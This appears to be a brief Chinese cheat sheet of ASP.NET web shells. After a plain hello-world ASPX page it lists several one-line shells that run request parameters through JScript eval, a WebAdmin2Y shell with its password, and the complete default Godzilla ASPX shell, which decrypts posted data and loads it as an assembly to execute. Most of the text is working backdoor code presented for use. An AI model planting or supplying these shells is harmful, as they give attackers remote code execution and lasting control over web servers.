一般C#语言。

index.aspx
```
<%@ Page Language="C#" %>
<!DOCTYPE html>
<html>
<head>
    <title>ASP.NET Hello World</title>
</head>
<body>
    <form id="form1" runat="server">
        <div>
aspx
            <asp:Label ID="lblMessage" runat="server" Text="">aspx</asp:Label>
        </div>
    </form>
</body>
</html>

```
一句话木马
```
<%@ Page Language="Jscript"%> <%eval(Request.Item["mbg"],"unsafe");%>

<script language="C#"runat="server">WebAdmin2Y.x.y a=new WebAdmin2Y.x.y("add6bb58e139be10")</script>

<%@ Page Language="Jscript" validateRequest="false" %><%Response.Write(eval(Request.Item["w"],"unsafe"));%>

<script language="C#" runat="server">  WebAdmin2Y.x.y aaaaa = new WebAdmin2Y.x.y("add6bb58e139be10"); </script>
 密码是webadmin

<%@ Page Language="Jscript"%><%Response.Write(eval(Request.Item["z"],"unsafe"));%>

```
哥斯拉默认
```
<%@ Page Language="C#"%><%try { string key = "3c6e0b8a9c15224a"; string pass = "pass"; string md5 = System.BitConverter.ToString(new System.Security.Cryptography.MD5CryptoServiceProvider().ComputeHash(System.Text.Encoding.Default.GetBytes(pass + key))).Replace("-", ""); byte[] data = System.Convert.FromBase64String(Context.Request[pass]); data = new System.Security.Cryptography.RijndaelManaged().CreateDecryptor(System.Text.Encoding.Default.GetBytes(key), System.Text.Encoding.Default.GetBytes(key)).TransformFinalBlock(data, 0, data.Length); if (Context.Session["payload"] == null) { Context.Session["payload"] = (System.Reflection.Assembly)typeof(System.Reflection.Assembly).GetMethod("Load", new System.Type[] { typeof(byte[]) }).Invoke(null, new object[] { data }); ; } else { System.IO.MemoryStream outStream = new System.IO.MemoryStream(); object o = ((System.Reflection.Assembly)Context.Session["payload"]).CreateInstance("LY"); o.Equals(Context); o.Equals(outStream); o.Equals(data); o.ToString(); byte[] r = outStream.ToArray(); Context.Response.Write(md5.Substring(0, 16)); Context.Response.Write(System.Convert.ToBase64String(new System.Security.Cryptography.RijndaelManaged().CreateEncryptor(System.Text.Encoding.Default.GetBytes(key), System.Text.Encoding.Default.GetBytes(key)).TransformFinalBlock(r, 0, r.Length))); Context.Response.Write(md5.Substring(16)); } } catch (System.Exception) { }
%>
```